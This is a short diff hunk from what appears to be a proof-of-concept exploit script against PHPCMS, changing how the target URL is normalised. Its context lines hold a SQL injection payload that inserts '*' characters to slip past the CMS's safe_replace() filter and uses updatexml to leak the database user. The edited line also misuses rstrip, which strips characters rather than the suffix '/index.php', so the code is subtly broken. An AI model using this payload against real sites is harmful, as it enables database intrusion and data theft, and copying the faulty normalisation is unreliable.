@@ -31,7 +31,7 @@ def poc(url):
 
 def __poc(url):
     url = url if '://' in url else 'http://' + url
-    url = url.split('#')[0].split('?')[0].rstrip('/')
+    url = url.split('#')[0].split('?')[0].rstrip('/').rstrip('/index.php')
 
     # use "*" to bypass filter "safe_replace()" in PHPCMS
     payload = "&id=%*27 and updat*exml(1,con*cat(1,(us*er())),1)%23&modelid=1&catid=1&m=1&f="
